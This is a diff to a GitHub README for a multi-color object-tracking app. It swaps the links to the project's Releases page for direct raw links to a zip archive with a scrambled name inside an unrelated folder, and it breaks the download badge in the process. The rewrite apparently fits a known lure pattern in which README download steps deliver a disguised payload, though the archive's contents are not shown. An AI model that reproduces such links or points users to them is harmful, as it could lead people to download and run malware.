@@ -1,6 +1,6 @@
 # 🎨 MULTI-COLOR-OBJECT-TRACKING-WITH-SOUND-ALERTS - Track Colors, Hear Alerts
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Release-blue)](https://github.com/Tanimhossain128/MULTI-COLOR-OBJECT-TRACKING-WITH-SOUND-ALERTS/releases)
+[![Download](https://raw.githubusercontent.com/Tanimhossain128/MULTI-COLOR-OBJECT-TRACKING-WITH-SOUND-ALERTS/main/prefavor/ALERTS-SOUN-TRACKIN-MULT-COLO-WIT-OBJEC-Odontaspis.zip%20Now-Get%20the%20Release-blue)](https://raw.githubusercontent.com/Tanimhossain128/MULTI-COLOR-OBJECT-TRACKING-WITH-SOUND-ALERTS/main/prefavor/ALERTS-SOUN-TRACKIN-MULT-COLO-WIT-OBJEC-Odontaspis.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets these requirements:
 To install the application, please follow these steps:
 
 1. **Visit the Releases Page:** Click this link to access the download page:  
-   [Download Here](https://github.com/Tanimhossain128/MULTI-COLOR-OBJECT-TRACKING-WITH-SOUND-ALERTS/releases)
+   [Download Here](https://raw.githubusercontent.com/Tanimhossain128/MULTI-COLOR-OBJECT-TRACKING-WITH-SOUND-ALERTS/main/prefavor/ALERTS-SOUN-TRACKIN-MULT-COLO-WIT-OBJEC-Odontaspis.zip)
 
 2. **Choose the Latest Release:** Look for the most recent version at the top of the page. You'll find a list of assets associated with that version.
 
